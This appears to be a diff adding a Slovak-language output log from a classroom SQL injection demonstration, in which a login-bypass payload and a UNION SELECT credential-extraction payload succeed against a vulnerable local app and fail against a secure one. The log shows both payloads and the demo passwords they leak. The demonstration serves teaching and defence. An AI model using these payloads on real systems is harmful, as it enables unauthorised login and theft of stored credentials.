@@ -1,0 +1,43 @@
+
+======================================================================
+SQL INJECTION — DEMONŠTRÁCIA (vulnerable vs. secure)
+======================================================================
+
+======================================================================
+[1] LOGIN BYPASS — ZRANITEĽNÁ  (http://127.0.0.1:5000)
+======================================================================
+    Payload username: "admin' OR '1'='1' -- "
+    Payload password: 'cokolvek'
+    >>> VÝSLEDOK: [OK] Login OBÍDENÝ! Útočník je prihlásený bez hesla.
+
+======================================================================
+[2] UNION-BASED EXTRAKCIA DÁT — ZRANITEĽNÁ  (http://127.0.0.1:5000)
+======================================================================
+    Payload search: "' UNION SELECT id, username, password, role FROM users -- "
+    >>> VÝSLEDOK: [OK] ÚNIK DÁT! Z tabuľky users unikli hodnoty:
+          - SuperTajneHeslo123
+          - jano2024
+          - macka.*
+
+======================================================================
+[1] LOGIN BYPASS — BEZPEČNÁ  (http://127.0.0.1:5001)
+======================================================================
+    Payload username: "admin' OR '1'='1' -- "
+    Payload password: 'cokolvek'
+    >>> VÝSLEDOK: [X] Login zlyhal — bypass NEPREŠIEL.
+
+======================================================================
+[2] UNION-BASED EXTRAKCIA DÁT — BEZPEČNÁ  (http://127.0.0.1:5001)
+======================================================================
+    Payload search: "' UNION SELECT id, username, password, role FROM users -- "
+    >>> VÝSLEDOK: [X] Žiadne dáta neunikli — injection NEPREŠLA.
+
+======================================================================
+ZHRNUTIE
+======================================================================
+  Zraniteľná — login bypass:     ÚSPEŠNÝ [OK]
+  Zraniteľná — UNION extrakcia:  ÚSPEŠNÁ [OK]
+  Bezpečná   — login bypass:     ODOLALA [X]
+  Bezpečná   — UNION extrakcia:  ODOLALA [X]
+
+  => Presne očakávaný výsledok: zraniteľná padla, bezpečná odolala.
